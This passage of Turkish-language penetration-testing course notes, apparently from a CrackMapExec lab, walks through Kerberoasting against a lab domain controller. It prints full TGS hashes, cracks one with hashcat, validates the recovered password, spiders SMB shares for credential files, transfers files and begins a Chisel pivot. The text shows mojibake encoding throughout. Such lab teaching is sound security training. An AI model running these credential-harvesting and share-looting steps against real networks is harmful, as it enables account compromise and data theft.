Not: ModÃ¼lÃ¼ sahip olduÄŸumuz kullanÄ±cÄ±larla test etmek iÃ§in, `--no-bruteforce` ve            `--continue-on-success` ile Ã§oklu kullanÄ±cÄ± iÅŸlevselliÄŸi bir modÃ¼lÃ¼ aynÄ± anda birden fazla hesapla test etmeyi desteklemediÄŸinden, bunlarÄ± tek tek denemek gerekir.


### Finding Kerberoastable Accounts

Kerberoasting saldÄ±rÄ±sÄ±, tipik olarak bir servis hesabÄ± olan `servicePrincipalName (SPN)` deÄŸerlerine sahip bir kullanÄ±cÄ±dan TGS (Ticket Granting Service) Biletleri toplamayÄ± amaÃ§lar. Herhangi bir geÃ§erli Active Directory hesabÄ±, herhangi bir SPN hesabÄ± iÃ§in bir TGS talep edebilir. Ticket'Ä±n bir kÄ±smÄ± hesabÄ±n `NTLM parola hash'i` ile ÅŸifrelenir, bu da parolayÄ± Ã§evrimdÄ±ÅŸÄ± olarak kÄ±rmayÄ± denememize olanak tanÄ±r. 

Kerberoastable hesaplarÄ±nÄ± bulmak iÃ§in, domain'de geÃ§erli bir kullanÄ±cÄ±ya sahip olmamÄ±z, `--kerberoasting` seÃ§eneÄŸi ve ardÄ±ndan bir dosya adÄ± ile LDAP protokolÃ¼nÃ¼ kullanmamÄ±z ve DC'nin IP adresini CrackMapExec'te hedef olarak belirtmemiz gerekir:


### Kerberoasting Attack

```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out

SMB dc01.inlanefreight.htb 445 DC01 [*] Windows
10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP dc01.inlanefreight.htb 389 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
LDAP dc01.inlanefreight.htb 389 DC01 [*] Total of
records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
grace memberOf: CN=SQL Admins,CN=Users,DC=inlanefreight,DC=htb pwdLastSet:
2022-10-25 15:48:04.646233 lastLogon:2022-12-01 07:20:01.171413
LDAP dc01.inlanefreight.htb 389 DC01
$krb5tgs$23$*grace$INLANEFREIGHT.HTB$inlanefreight.htb/grace*$ce19d59e7823
310c7fb51920d24bd56c$1cc46b764998c6077ee9a7f5a215a93bbae3b3a944584ac373823
a55c0d3e35600a91e0bd3c8b7e2366675dd10efb1c9fdde2d5dd46b1f6e346077daf4a3757
432921ae14c0801094c7fd2d0d50550c9a4924203e81272888ea1067f838cf306e6622102e
4ccc885158bd0515e7ec84fa5c6f660ce7045d41e16af7e8ece1878aef72e2605e4514b118
65bfbad3a4d788558395586ed4bbede9d0a2e106f4870bd2698f272b3ba30756fe84f44ab9
2ee92fbcd5b7cd66dd376f4ecb6f57f63ebfa2f8e0ff7794ce6a4bd9a49018b9bc64da5349
de833aff84d77ea5a1d6fdcb2b46986586e438535f3da26d077df2396d2b5d947a8bbfecbb
221c7babe2881558098adc70d68b9468257381eb0639a6a532486016167f3d246c10a43612
23b1c6f63fc9d34a749b2092a9b329761b7262259e22d8ff4a582d1f4b3c6627f5fa16684d
e5bdafb3fefca637f83eeede7d79542f470ad850c6e7f8141bdb6f2767f9ddbe81688f1e50
0fa59b09502eba8e733a3fd5548250299276b10365766c85a244ece2c9f0344f3b3b5953f1
31335596f5b91fcc365ba6ed4cab1ef2f72731d8b1e459fd69915df55c710d22e583712fd2
3999761411572089b0434782e05d364fb168eae1625b111e74351fd18ceb7186f14d25b533
d8c8b00dbbd5b0357e9e894fa65df8ef43bcd1547ab7a01f716a1c471b3e7df0f66c31e20e
e0e12d3d6f1deb859321a084fa819f7c8fc23cafa1cf6a19b4f65a7c7337e816b04bb1ef72
e45031493c9a0940519d53851beb2795d477f4c64a401eefc7a3541143df11ae983ba2ff3b
6d16580e23179bdece2fa9c4023dd71de199c94cbfbab166d0a64110e2522ff5f74c442ba0
439a72119835f0e01422d0f8cf758b9dc906074fab81957972732f60fc26d06af9170cf5f4
8531a5cf9cf63cd5cff0fad2f2e317588852c7df94954e2cb5b35e274de5976d33249e053c
f23d26f45f9c9fbd418b460b5a4cb0b11fabae91bdd2113798e5401891d514cf6525419eac
37b004487e83e6c50669d6560e07a753b86f4fb7535f3429a767e43f307dc3537eb3d808b4
fd517c0dcc6b8cf26cb1c978f67b349fa0e4699d1b2c7325f9d1d6cf31cfe6fbf8d837b0f5
d9b5265f9c3ccf9b79e9b88d6ab4a77297cd2866b732f1d4516541f556cd5c20dff46bfec4
56647159017bd34d02afe2f5baee661bfa48bcfccb08d8e835be6af48a17152811d9e03222
9c898df53082515a08c3962d4dca0dc262b758bc30fd18b36ecadc17d73141c03ae9deffcb
2c776305a1928e0addd709a2609192f8270be7ce38936a47f21f2b1eb5a6ed27e1c76719fc
83edffa5791064b8e77e643602fb6a459ae399ea48961e14125eba0fede24db448cfc42bb6
90bf0d7af80fedfb440e13e61a71996fcfe29c872add3d6189e085636c4eb2c480a171b121
5a43b438ff5ffccd6106e48e1b3
LDAP dc01.inlanefreight.htb 389 DC01 sAMAccountName:
peter memberOf: CN=Remote Management
Users,CN=Builtin,DC=inlanefreight,DC=htb pwdLastSet: 2022-10-26
06:55:58.364988 lastLogon:2022-10-26 14:45:08.305940
LDAP dc01.inlanefreight.htb 389 DC01
$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$eb2c68e3a589
9ec32a9786b8ec58fe7d$f1baabf78434c380a2d7bba8c8cfae70fe520c6d7a710ee5f8754
c1d7fcaa77b66cf26f02d3a97e8a98c3443d1791418f26c181433be3f42673ab3accfb2ed9
ec3c67acc5269fcd31b327cc676ff3a482a7741f640e2f2918c31949297327e2c771e340a1
ed8859e95029001313d5b948041e6ad6e8fff55cfeb09fbdf3445295b939a94601b6f28af7
304fd2708f4f68f7568c69fce576bffe8f5db57def476123f89ea380917e5bc54e5e993717
b4949f4de5a0c44f5e40a359bb5945feda402cca16bd0a8d85a374f16bd061e64e2bc49d35
2fa504490260e9808e49daafef1c08390bc3f21ec3f5167a649ebb2a91b7021c9b6df26b1c
3bc68b2e53b94e9a09861ef26cc5aa1bfcdd543fa77d4b9428a2c8ef90f6d54388ed55bbad
930cea6193160ff58330ca083b095edab8e11ba0ce1c53a51a341222144f1f0bbf82169592
d6537b676c54955addb6bdd9e4361fc177bff5d2bf581f24a682c0f32dd381e0d657b5caea
b6e6b6bcffdab8e509a3f3af414ced94c9198915a0c880bea6c0b6a1818c88b24ab5c87984
889363ef5993a190266def79c5d3ddcfecfdd3263dc83a303db8ab000a3021c1b50844e5ae
796aa79620ff79bfe2b0347d04de8f14a48f6b4e970fdaf03efce818c13d7e7da068d9bbdc
af361d77d5907a4b672e327f17833b2cdee523dae8a878e8d3c273bd0038c66475d00c337a
c19df2fe8cc6e9e4e49335e30dbb4eebd3f9d24e762524d7ab6e36ab532a1924dc8a6e6049
99e8ed3736ea1f29a3758d22f982600a0523b56780364e892014879f56fe79ce21442a4509
cd548cdf180529ea283509bf8925b7d5275284994caef811731ba63b1cabd92368299e9364
f3bf4d77bb7a0aec6487d0cfd776b9ee234f170a387c72ebc06aca19ed31b6d86a9986634a
2aa3f538c51aea0db3efd26a8e7ed438c60cbb2cc5dcbb6e564c1364775f84ed9b49d65ec0
40c6e75d4e5182a26cd86d17197212331edb0d135e7e77d3ee3277164af500e0c61d6f598b
a1950868bf0cfd318547830a3faeb98fd40adccabd72b02733c90f8563326d65be4c707d68
a26d4482525bbb1084b816e83772b4098a5d54a22b4c7abbc3b32fa0e9b57a5e660ae8378b
f54e8b405a5cff00b3038bcabc40a089732de4c93a44c84446f82f19f5f17310d8963cff4c
ee063767cb8680a5edeec3b59fcaaa1df2e05432478028a6e9346c09685febbf28ed9cbe36
c2fcd3246f973dbc8bec55afdd0c36e140b34bd1203e61370dcdf2899ea0b88cfa6e5c562e
08214441b4ebe7eeec4053349682bd0424cddb5c601ba681daad100ae639730a058b7b6af5
fc5edade0f24ccac56183d01508a9fda7d7d14ccce48c9e86d3b188cd5cd67b400582b267a
1f745a700fad067fe55f5ccca3a8655aeb28af683f9d6ccdc2eeb06d1adc2c4056bccef814
f172dcf06f756648e4c4498ef57
```


Herhangi bir Kerberoastable hesabÄ± varsa, CrackMapExec bunlarÄ± Ã§evrimdÄ±ÅŸÄ± olarak kÄ±rmayÄ± denememiz gereken `hash` ile birlikte gÃ¶rÃ¼ntÃ¼ler. Bizim durumumuzda, ÅŸifreyi kÄ±rmak iÃ§in `rockyou.txt` kelime listesini ve Hashcat uygulamasÄ±nÄ± kullanacaÄŸÄ±z. 


### Cracking the Hash

```
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
<SNIP>
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386
$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$026257d4f9aa
58cd5c654295eac8255f$22ea3062f1822e967934263b37ff1b565342b3934c2864b46366d
e7bf3e230d0cb08f605deae3053c6f93944256c409c9f352ac337c33f5c4ad8adf125cd686
3598d3a8c97ec60fb19c5e3691e825f95333509fbff9e2832d465ce2beee4f290bac2c52a2
ce625b613778a5ebebb668a2538cb547c0d0d5c45e455f5df03e08a054349fcd24e140dcb2
315f1af23e11ebe547556a24a200585353de9e6654ec71f205a3e37fa129bede32f0ca385d
fe7ff84cea07c8bc646147782cadb47e03b1a230c8f828a40a34d78d57513892fb1fee09a7
888be76738374fbd3baa2050572db461221c256abafafc92e6bfc84f8c5b0771c5bb1846f0
7b971089570b12bc8eb970a8da3f5d81f16a4353e86e8cf8ff77f834b6d9384d3e81058583
aef8d145427bbc772f9f56153b8bc075d73841e3592ae4da6533cefb28b20186d2df253787
10411b517b6bca5f9c1ddfed3e357a12f8ab677b963ca4aa16de76adb49068ee7d956e95ac
04c624fef3f288640ccd260c12dddfa2771b5582e1351af1d99aa2f185687cc1613b294430
8563afbc6d4caf9da56e61ccbf46359a3b50b1defdb8b54c4ddbcee0ce3a18b6b532ba7227
c0918795531726e773754ee35cf3ce5b5dcf89ed8b13dd2774e6c1342e77f3fcae92065761
95b4a48f845f193e8b949b499c14f0bf8086c73da821c183b8e9155e15e5295b7a05b49643
3a946fecd51730150f6655e761b56b3ce0ad27884888ef88b7fd1e2fc7dd7f113cc84c684a
976f43bdde4d3e6f8a20114da482c640dd83439b781bf6c00a73419720d1201bd5f3a9e883
27b87cb6cf37ee88b7d5e04d51a09994b350bcbb1e3d6345293773874e3771558fea92dae0
aa010e88372cd5520a06538c0a6c93584f6490601cc5cc1c6644974ad6e4103f027a7d3292
4c680679478f3228c54f171920cd48272d4fcbd014acaea185f5e219a00476d8a78abcd8c3
bdbad14f5850476c3eeb62f0817ffc5ff3467a01408c75a743a71045edfd329644683c0800
5c7abc83e8527209b9b621488e39e9b2e5baca8247020b7e53dc1f9efa40d7d70886affa05
90922641c31ace175df3a0ab7a8f989fa6bd7442b07b67a3d72faabec69f61a6d455d18544
979f844ca6b64d9c3487be207e8ee80b605a2abe09221382e6574fda9e39adf03ab3687152
af2fbb210728777b481dd7290731a0abecdfb63d72d9f9da6ac13e7b0363ab194a5e714df5
dbac2eabacfdd6666c736ee7d074720d0860c5ed8b5c937cd12188a18b2bef1511642b5b13
a4c5179e23e7867a9d5536e309100c8bc9a2a71b370a733fd9e972683138d08bbb5c923257
888efc51cef997b062fca914954d91cfab3e9aafccf051c208d4149b6abc26fd1c1cc2e630
a2f4fc0dae40e1b1ad2cd477b9feabdc9e696d43080438d9f1207b96ce7fc3a49739f4bc50
dee57553a661778ea14cf431a0e:Password123
<SNIP>

```

HesabÄ±n parolasÄ±nÄ± aldÄ±ktan sonra, hesabÄ±n hala etkin olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamamÄ±z gerekir. Bunu SMB protokolÃ¼nÃ¼ kullanarak yapabiliriz, Ã§Ã¼nkÃ¼ normal bir domain kullanÄ±cÄ±sÄ± veya yÃ¶netici hesabÄ± olarak kimlik doÄŸrulamasÄ± yapmaya Ã§alÄ±ÅŸacaktÄ±r.


### Testing the Account Credentials

```
crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\peter:Password123

```

Bir sonraki bÃ¶lÃ¼mde, paylaÅŸÄ±lan klasÃ¶rlerde ilginÃ§ bilgiler aramak iÃ§in bulduÄŸumuz tÃ¼m aktif hesaplarÄ± nasÄ±l kullanabileceÄŸimizi tartÄ±ÅŸacaÄŸÄ±z.

---

### Bir SMB PaylaÅŸÄ±mÄ±nda Spidering ve Ã–nemli Bilgileri Bulma

Åirketlerin, insanlar ve departmanlar arasÄ±nda iÅŸbirliÄŸini saÄŸlamak iÃ§in bilgileri merkezi bir konumda depolamasÄ± gerekir. Genellikle bir departman, baÅŸka bir departmanÄ±n iÅŸlemesi gereken bilgileri iÅŸler. Åirketlerin bu tÃ¼r bir iÅŸbirliÄŸine izin vermesinin en yaygÄ±n yollarÄ±ndan biri paylaÅŸÄ±lan klasÃ¶rlerdir.

EriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z hesaplarÄ± kullanarak paylaÅŸÄ±m klasÃ¶rlerine eriÅŸim talep etmek ve eriÅŸimleri olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in `--shares` seÃ§eneÄŸini kullanabiliriz.


### HesaplarÄ±n PaylaÅŸÄ±lan KlasÃ¶rlere EriÅŸimi Olup OlmadÄ±ÄŸÄ±nÄ± Belirleme

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --shares

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [+] Enumerated shares
SMB 10.129.203.121 445 DC01 Share
Permissions Remark
SMB 10.129.203.121 445 DC01 ----- ------
----- ------
SMB 10.129.203.121 445 DC01 ADMIN$
Remote Admin
SMB 10.129.203.121 445 DC01 C$
Default share
SMB 10.129.203.121 445 DC01 carlos
SMB 10.129.203.121 445 DC01 CertEnroll READ
Active Directory Certificate Services share
SMB 10.129.203.121 445 DC01 D$
Default share
SMB 10.129.203.121 445 DC01 david
SMB 10.129.203.121 445 DC01 IPC$ READ
Remote IPC
SMB 10.129.203.121 445 DC01 IT
READ,WRITE
SMB 10.129.203.121 445 DC01 john
SMB 10.129.203.121 445 DC01 julio
READ,WRITE
SMB 10.129.203.121 445 DC01 linux01
READ,WRITE
SMB 10.129.203.121 445 DC01 NETLOGON READ
Logon server share
SMB 10.129.203.121 445 DC01 svc_workstations
SMB 10.129.203.121 445 DC01 SYSVOL READ
Logon server share
SMB 10.129.203.121 445 DC01 Users
```

Not: Bu modÃ¼l yazÄ±lÄ±rken, CrackMapExec `--shares` seÃ§eneÄŸi ile birden fazla kullanÄ±cÄ± adÄ± ve parola sorgulamayÄ± desteklemiyordu

`--shares` seÃ§eneÄŸi, hedef makinedeki her bir paylaÅŸÄ±mÄ± ve kullanÄ±cÄ±mÄ±zÄ±n bu paylaÅŸÄ±mlar Ã¼zerinde hangi izinlere (READ/WRITE) sahip olduÄŸunu gÃ¶sterir. IT adlÄ± ilginÃ§ bir klasÃ¶re okuma ve yazma eriÅŸimimiz var. [Impacket smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) kullanarak kolayca aÃ§abilir veya paylaÅŸÄ±mÄ± baÄŸlayabiliriz. YÃ¼zlerce paylaÅŸÄ±mÄ±n iÃ§eriÄŸini kontrol ederken elveriÅŸsiz hale gelebilir. Bu amaÃ§la, CrackMapExec, `spider` seÃ§eneÄŸi ve `spider_plus` modÃ¼lÃ¼ olmak Ã¼zere iki harika Ã¶zellikle birlikte gelir.

Not: Domain'deki herhangi bir bilgisayarÄ±n bir paylaÅŸÄ±mlÄ± klasÃ¶re sahip olabileceÄŸini unutmayÄ±n. PaylaÅŸÄ±lan klasÃ¶rleri bulmak iÃ§in hedeflediÄŸimiz aÄŸda Ã¶nceden tanÄ±mlanmÄ±ÅŸ makineleri hedeflemeliyiz.


### The Spider Option

CrackMapExec'teki `--spider` seÃ§eneÄŸi, remote bir paylaÅŸÄ±m iÃ§inde arama yapmanÄ±za ve aradÄ±ÄŸÄ±nÄ±z ÅŸeye baÄŸlÄ± olarak ilginÃ§ dosyalar bulmanÄ±za olanak tanÄ±r. Ã–rneÄŸin, `--pattern` seÃ§eneÄŸini ve ardÄ±ndan aramak istediÄŸimiz kelimeyi ekliyoruz, bu durumda `txt` ve iÃ§inde `txt` olan tÃ¼m dosyalarÄ± listeleyebiliriz (`test.txt,` a`txtb.csv`)

### â€œtxtâ€ Ä°Ã§eren DosyalarÄ± Aramak iÃ§in spider SeÃ§eneÄŸini Kullanma

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --spider IT  --pattern txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Started spidering
SMB 10.129.203.121 445 DC01 [*] Spidering .
SMB 10.129.203.121 445 DC01
//10.129.203.121/IT/Creds.txt [lastm:'2022-10-31 11:16' size:54]
SMB 10.129.203.121 445 DC01
//10.129.203.121/IT/IPlist.txt [lastm:'2022-10-31 11:15' size:36]
<SNIP>
SMB 10.129.203.121 445 DC01 [*] Done spidering
(Completed in 1.7534186840057373)


```


KlasÃ¶rler, dosya adlarÄ± veya dosya iÃ§eriÄŸi Ã¼zerinde daha ayrÄ±ntÄ±lÄ± aramalar yapmak iÃ§in      `--regex [REGEX]` seÃ§eneÄŸiyle regex ifadeleri de kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, paylaÅŸÄ±lan IT klasÃ¶rÃ¼ndeki herhangi bir dosya ve dizini gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--regex` . kullanalÄ±m:


### IT PaylaÅŸÄ±mÄ±ndaki TÃ¼m Dosya ve Dizinleri Listele seÃ§eneÄŸini de kullanabiliriz


```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT -
-regex .

SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.204.177 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.204.177 445 DC01 [*] Started spidering
SMB 10.129.204.177 445 DC01 [*] Spidering .
SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/.
[dir]
SMB 10.129.204.177 445 DC01 //10.129.204.177/IT/..
[dir]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Documents [dir]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/IPlist.txt [lastm:'2022-12-01 09:01' size:36]
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/passwd [lastm:'2022-12-19 11:28' size:3456]
SMB 10.129.204.177 445 DC01 
//10.129.204.177/IT/Documents/. [dir]
...SNIP...
SMB 10.129.204.177 445 DC01 [*] Done spidering
(Completed in 1.593825340270996)
```


Dosya iÃ§eriÄŸinde arama yapmak istiyorsak `--content` seÃ§eneÄŸi ile bunu etkinleÅŸtirmemiz gerekir. â€œ`Encrypt`â€ kelimesini iÃ§eren bir dosya arayalÄ±m.


### Dosya Ä°Ã§eriÄŸini Arama

```
crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! --spider IT  --content --regex Encrypt

SMB 10.129.204.177 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.204.177 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.204.177 445 DC01 [*] Started spidering
SMB 10.129.204.177 445 DC01 [*] Spidering .
SMB 10.129.204.177 445 DC01
//10.129.204.177/IT/Creds.txt [lastm:'2022-12-01 09:01' size:54 offset:54
regex:'b'Encrypt'']
SMB 10.129.204.177 445 DC01 [*] Done spidering
(Completed in 3.5477945804595947)
```

Ã‡ok ilginÃ§ bilgiler iÃ§eren `Creds.txt` adlÄ± ilginÃ§ bir dosya gÃ¶rebiliriz. CrackMapExec kullanarak remote bir dosyayÄ± alabiliriz. PaylaÅŸÄ±mÄ± `--share SHARENAME` seÃ§eneÄŸini kullanarak belirtmemiz, ardÄ±ndan `--get-file` kullanmamÄ±z ve ardÄ±ndan dosyanÄ±n paylaÅŸÄ±m iÃ§indeki yolunu kullanmamÄ±z ve bir Ã§Ä±ktÄ± dosyasÄ± adÄ± belirlememiz gerekir.


### PaylaÅŸÄ±lan KlasÃ¶rdeki Bir DosyayÄ± Alma

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT --
get-file Creds.txt Creds.txt

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Copy Creds.txt to
Creds.txt
SMB 10.129.203.121 445 DC01 [+] File Creds.txt was
transferred to Creds.txt
```


```
cat Creds.txt
Creds Encrypted:
ZWxpZXNlcjpTdXBlckNvbXBsZXgwMTIxIzIK
```



Tersi durumda, remote bir paylaÅŸÄ±ma bir dosya gÃ¶ndermek istediÄŸimizi dÃ¼ÅŸÃ¼nÃ¼n. `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸumuz bir paylaÅŸÄ±m bulmamÄ±z gerekir. Daha sonra `--get-file` ile yaptÄ±ÄŸÄ±mÄ±z gibi `--put-file` seÃ§eneÄŸini kullanabiliriz.

### PaylaÅŸÄ±lan KlasÃ¶re Dosya GÃ¶nderme

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! --share IT   --put-file /etc/passwd passwd

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 10.129.203.121 445 DC01 [*] Copy /etc/passwd
to passwd
SMB 10.129.203.121 445 DC01 [+] Created file
/etc/passwd on \\IT\passwd
```

Not: BÃ¼yÃ¼k bir dosya aktarÄ±yorsak ve baÅŸarÄ±sÄ±z olursa, tekrar denediÄŸinizden emin olun. Hata almaya devam ederseniz, `--smb-timeout` seÃ§eneÄŸini varsayÄ±lan iki (2) deÄŸerinden daha bÃ¼yÃ¼k bir deÄŸerle eklemeyi deneyin.


### The spider_plus Module

Bazen bir paylaÅŸÄ±mla karÅŸÄ±laÅŸabiliriz ve onu baÄŸlamadan veya **`smbclient.py`** kullanmadan uzantÄ±yla ilgili tÃ¼m dosyalarÄ± hÄ±zlÄ±ca listelemek isteyebiliriz. CrackMapExec, bunu halledecek **`spider_plus`** adÄ±nda bir modÃ¼l ile gelir. Bu modÃ¼l, varsayÄ±lan olarak **`/tmp/cme_spider_plus`** adlÄ± bir klasÃ¶r ve paylaÅŸÄ±mla ilgili dosya bilgilerini iÃ§eren **`IP.json`** adlÄ± bir JSON dosyasÄ± oluÅŸturur. **`EXCLUDE_DIR`** modÃ¼l seÃ§eneÄŸini kullanarak, araÃ§tÄ±n **`IPC$`**, **`NETLOGON`**, **`SYSVOL`** gibi paylaÅŸÄ±mlarÄ± gÃ¶z ardÄ± etmesini saÄŸlayabiliriz.


### Using the Module spider_plus

```
crackmapexec smb 10.129.203.121 -u grace -p 'Inlanefreight01!' -M
spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
plus with option:
SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
['ipc

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

```
{
  "IT": {
    "Creds.txt": {
      "atime_epoch": "2022-10-31 11:16:17",
      "ctime_epoch": "2022-10-31 11:15:17",
      "mtime_epoch": "2022-10-31 11:16:17",
      "size": "54 Bytes"
    },
    "IPlist.txt": {
      "atime_epoch": "2022-10-31 11:15:11",
      "ctime_epoch": "2022-10-31 11:14:52",
      "mtime_epoch": "2022-10-31 11:15:11",
      "size": "36 Bytes"
    }
  },
  "linux01": {
    "flag.txt": {
      "atime_epoch": "2022-10-05 10:17:02",
      "ctime_epoch": "2022-10-05 10:17:02",
      "mtime_epoch": "2022-10-11 11:44:14",
      "size": "52 Bytes"
    },
    "information-txt.csv": {
      "atime_epoch": "2022-10-31 15:00:58",
      "ctime_epoch": "2022-10-31 14:21:36",
      "mtime_epoch": "2022-10-31 15:00:58",
      "size": "284 Bytes"
    }
  }
}

```

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

```
crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL READ_ONLY=false

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SPIDER_P... 10.129.203.121 445 DC01 [*] Started spidering
plus with option:
SPIDER_P... 10.129.203.121 445 DC01 [*] DIR:
['ipc

```
ls -R /tmp/cme_spider_plus/10.129.203.121/
/tmp/cme_spider_plus/10.129.203.121/:
IT linux01

/tmp/cme_spider_plus/10.129.203.121/IT:
Creds.txt Documents IPlist.txt
...SNIP...

/tmp/cme_spider_plus/10.129.203.121/linux01:
flag.txt information-txt.csv
```

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

```
crackmapexec smb -M spider_plus --options

[*] spider_plus module options:
 READ_ONLY Only list files and put the name into a
JSON (default: True)
 EXCLUDE_EXTS Extension file to exclude (Default:
ico,lnk)
 EXCLUDE_DIR Directory to exclude (Default: print$)
 MAX_FILE_SIZE Max file size allowed to dump (Default:
51200)
 OUTPUT_FOLDER Path of the remote folder where the dump
will occur (Default: /tmp/cme_spider_plus)

```

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

